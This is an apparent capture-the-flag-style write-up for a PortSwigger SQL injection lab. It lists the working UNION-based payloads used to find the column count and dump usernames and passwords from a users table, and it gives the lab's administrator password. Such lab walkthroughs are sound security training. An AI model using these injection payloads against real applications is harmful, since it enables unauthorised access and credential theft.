https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Lab objective: `perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.`

The database contains a different table called `users`, with columns called `username` and `password`.
# Lab: SQL injection UNION attack, retrieving data from other tables

We know that this lab contains a SQL injection vulnerability in the product category filter.

Click product category filter then

1. Find the column number `category=Gifts' ORDER BY 2--`
2. Compatible with string data column `category=-Gifts' UNION SELECT 'B','A'--` so 2 columns are OK.
3. To get user_name and password query is `category=-Gifts' UNION SELECT username,password FROM users--`

`administrator` password is `rbda0czujflyi3a2koql`

To complete the lab login by this user_name and password